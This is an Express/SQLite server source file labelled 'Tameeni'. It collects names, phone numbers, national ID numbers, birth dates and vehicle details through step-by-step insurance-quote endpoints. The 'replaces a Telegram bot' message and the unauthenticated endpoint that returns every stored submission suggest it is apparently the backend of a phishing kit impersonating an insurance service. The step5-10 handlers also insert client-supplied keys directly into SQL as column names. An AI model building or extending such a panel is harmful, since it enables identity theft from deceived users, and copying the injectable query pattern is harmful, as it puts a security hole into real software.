const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const sqlite3 = require('sqlite3').verbose();
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet());
app.use(cors());
app.use(morgan('combined'));
app.use(express.json());
app.use(express.static('public'));

// Database setup
const db = new sqlite3.Database('./tameeni_data.db', (err) => {
  if (err) {
    console.error('Database connection error:', err);
  } else {
    console.log('Database connected successfully');
    initializeDatabase();
  }
});

// Initialize database tables
function initializeDatabase() {
  db.run(`
    CREATE TABLE IF NOT EXISTS submissions (
      id TEXT PRIMARY KEY,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
      step INTEGER,
      userName TEXT,
      phoneNumber TEXT,
      idNumber TEXT,
      offerType TEXT,
      regType TEXT,
      birthDate TEXT,
      serialNumber TEXT,
      carYear TEXT,
      carMake TEXT,
      usageType TEXT,
      city TEXT,
      startDate TEXT,
      insuranceType TEXT,
      insuranceClass TEXT,
      additionalCoverage TEXT,
      coverageAmount TEXT,
      finalData TEXT,
      status TEXT DEFAULT 'new'
    )
  `);
}

// API Endpoints

// Step 1 data collection
app.post('/api/step1', (req, res) => {
  try {
    const data = req.body;
    const id = uuidv4();
    
    const stmt = db.prepare(`
      INSERT INTO submissions (id, step, userName, phoneNumber, idNumber, offerType, regType, birthDate, serialNumber, carYear)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    
    stmt.run([
      id,
      1,
      data.userName,
      data.phoneNumber,
      data.idNumber,
      data.offerType,
      data.regType,
      data.birthDate,
      data.serialNumber,
      data.carYear
    ], function(err) {
      if (err) {
        console.error('Error saving step1 data:', err);
        res.status(500).json({ error: 'Error saving data' });
      } else {
        res.json({ success: true, id: id });
      }
    });
    
  } catch (error) {
    console.error('Error processing step1 data:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Step 2 data collection
app.post('/api/step2', (req, res) => {
  try {
    const data = req.body;
    
    const stmt = db.prepare(`
      UPDATE submissions SET 
        carMake = ?, usageType = ?, city = ?, startDate = ?, step = 2
      WHERE idNumber = ? AND step = 1
    `);
    
    stmt.run([
      data.carMake,
      data.usageType,
      data.city,
      data.startDate,
      data.idNumber
    ], function(err) {
      if (err) {
        console.error('Error updating step2 data:', err);
        res.status(500).json({ error: 'Error saving data' });
      } else {
        res.json({ success: true });
      }
    });
    
  } catch (error) {
    console.error('Error processing step2 data:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Step 3 data collection
app.post('/api/step3', (req, res) => {
  try {
    const data = req.body;
    
    const stmt = db.prepare(`
      UPDATE submissions SET 
        insuranceType = ?, insuranceClass = ?, step = 3
      WHERE idNumber = ? AND step = 2
    `);
    
    stmt.run([
      data.insuranceType,
      data.insuranceClass,
      data.idNumber
    ], function(err) {
      if (err) {
        console.error('Error saving step3 data:', err);
        res.status(500).json({ error: 'Error saving data' });
      } else {
        res.json({ success: true });
      }
    });
    
  } catch (error) {
    console.error('Error processing step3 data:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Step 4 data collection
app.post('/api/step4', (req, res) => {
  try {
    const data = req.body;
    
    const stmt = db.prepare(`
      UPDATE submissions SET 
        additionalCoverage = ?, step = 4
      WHERE idNumber = ? AND step = 3
    `);
    
    stmt.run([
      data.additionalCoverage,
      data.idNumber
    ], function(err) {
      if (err) {
        console.error('Error saving step4 data:', err);
        res.status(500).json({ error: 'Error saving data' });
      } else {
        res.json({ success: true });
      }
    });
    
  } catch (error) {
    console.error('Error processing step4 data:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Final data collection
app.post('/api/final', (req, res) => {
  try {
    const data = req.body;
    
    const stmt = db.prepare(`
      UPDATE submissions SET 
        coverageAmount = ?, finalData = ?, step = 5, status = 'completed'
      WHERE idNumber = ? AND step = 4
    `);
    
    stmt.run([
      data.coverageAmount,
      JSON.stringify(data),
      data.idNumber
    ], function(err) {
      if (err) {
        console.error('Error saving final data:', err);
        res.status(500).json({ error: 'Error saving data' });
      } else {
        res.json({ success: true });
      }
    });
    
  } catch (error) {
    console.error('Error processing final data:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Support for additional steps
['step5', 'step6', 'step7', 'step8', 'step9', 'step10'].forEach(stepName => {
  app.post(`/api/${stepName}`, (req, res) => {
    try {
      const data = req.body;
      const stepNum = parseInt(stepName.replace('step', ''));
      
      const stmt = db.prepare(`
        UPDATE submissions SET 
          ${Object.keys(data).map(key => `${key} = ?`).join(', ')},
          step = ?
        WHERE idNumber = ? AND step < ?
      `);
      
      const values = [...Object.values(data), stepNum, data.idNumber, stepNum];
      
      stmt.run(values, function(err) {
        if (err) {
          console.error(`Error saving data for step ${stepNum}:`, err);
          res.status(500).json({ error: 'Error saving data' });
        } else {
          res.json({ success: true });
        }
      });
      
    } catch (error) {
      console.error(`Error processing data for step ${stepName}:`, error);
      res.status(500).json({ error: 'Server error' });
    }
  });
});

// Get all submissions
app.get('/api/submissions', (req, res) => {
  db.all(`
    SELECT * FROM submissions 
    ORDER BY timestamp DESC 
    LIMIT 100
  `, (err, rows) => {
    if (err) {
      console.error('Error fetching submissions:', err);
      res.status(500).json({ error: 'Error fetching data' });
    } else {
      res.json(rows);
    }
  });
});

// Get submissions by status
app.get('/api/submissions/status/:status', (req, res) => {
  const status = req.params.status;
  db.all(`
    SELECT * FROM submissions 
    WHERE status = ? 
    ORDER BY timestamp DESC
  `, [status], (err, rows) => {
    if (err) {
      console.error('Error fetching submissions by status:', err);
      res.status(500).json({ error: 'Error fetching data' });
    } else {
      res.json(rows);
    }
  });
});

// Quick statistics
app.get('/api/stats', (req, res) => {
  const queries = [
    new Promise((resolve, reject) => {
      db.get('SELECT COUNT(*) as total FROM submissions', (err, row) => {
        if (err) reject(err);
        else resolve(row.total);
      });
    }),
    new Promise((resolve, reject) => {
      db.get('SELECT COUNT(*) as completed FROM submissions WHERE status = "completed"', (err, row) => {
        if (err) reject(err);
        else resolve(row.completed);
      });
    }),
    new Promise((resolve, reject) => {
      db.get('SELECT COUNT(*) as today FROM submissions WHERE DATE(timestamp) = DATE("now")', (err, row) => {
        if (err) reject(err);
        else resolve(row.today);
      });
    })
  ];

  Promise.all(queries).then(([total, completed, today]) => {
    res.json({
      total,
      completed,
      today,
      completion_rate: total > 0 ? Math.round((completed / total) * 100) : 0
    });
  }).catch(err => {
    console.error('Error fetching stats:', err);
    res.status(500).json({ error: 'Error fetching data' });
  });
});

// Root page
app.get('/', (req, res) => {
  res.redirect('/dashboard.html');
});

// API Status page
app.get('/api-status', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html dir="rtl" lang="ar">
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Tameeni - API Dashboard</title>
      <style>
        body {
          font-family: 'Cairo', Arial, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          text-align: center;
          padding: 50px;
          margin: 0;
        }
        .container {
          max-width: 600px;
          margin: 0 auto;
          background: rgba(255,255,255,0.1);
          padding: 40px;
          border-radius: 20px;
          backdrop-filter: blur(10px);
        }
        h1 { font-size: 2.5em; margin-bottom: 20px; }
        .status { 
          font-size: 1.2em; 
          padding: 15px; 
          background: rgba(76, 175, 80, 0.3); 
          border-radius: 10px; 
          margin: 20px 0; 
        }
        .api-info {
          text-align: right;
          background: rgba(0,0,0,0.2);
          padding: 20px;
          border-radius: 10px;
          margin: 20px 0;
        }
        .api-endpoint {
          font-family: monospace;
          background: rgba(0,0,0,0.3);
          padding: 5px 10px;
          border-radius: 5px;
          display: inline-block;
          margin: 5px 0;
        }
        .links {
          margin-top: 20px;
        }
        .links a {
          color: white;
          text-decoration: none;
          background: rgba(255,255,255,0.2);
          padding: 10px 20px;
          border-radius: 10px;
          margin: 0 10px;
          display: inline-block;
        }
        .links a:hover {
          background: rgba(255,255,255,0.3);
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🚀 Tameeni - Dashboard API</h1>
        <div class="status">
          ✅ Server is running successfully!
        </div>
        <div class="api-info">
          <h3>📡 Available API Endpoints:</h3>
          <div class="api-endpoint">POST /api/step1 - Step 1 data</div>
          <div class="api-endpoint">POST /api/step2 - Step 2 data</div>
          <div class="api-endpoint">POST /api/step3 - Step 3 data</div>
          <div class="api-endpoint">POST /api/step4 - Step 4 data</div>
          <div class="api-endpoint">POST /api/step5-10 - Additional steps</div>
          <div class="api-endpoint">POST /api/final - Final data</div>
          <div class="api-endpoint">GET /api/submissions - View all data</div>
          <div class="api-endpoint">GET /api/stats - Quick statistics</div>
        </div>
        <div class="links">
          <a href="/dashboard.html">📊 Open Dashboard</a>
          <a href="/api-status">ℹ️ API Info</a>
        </div>
        <p>Your website can now use this API instead of Telegram bot</p>
      </div>
    </body>
    </html>
  `);
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📊 Dashboard API ready`);
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n⏹️  Shutting down server...');
  db.close((err) => {
    if (err) {
      console.error('Error closing database:', err);
    } else {
      console.log('✅ Database closed successfully');
    }
    process.exit(0);
  });
});
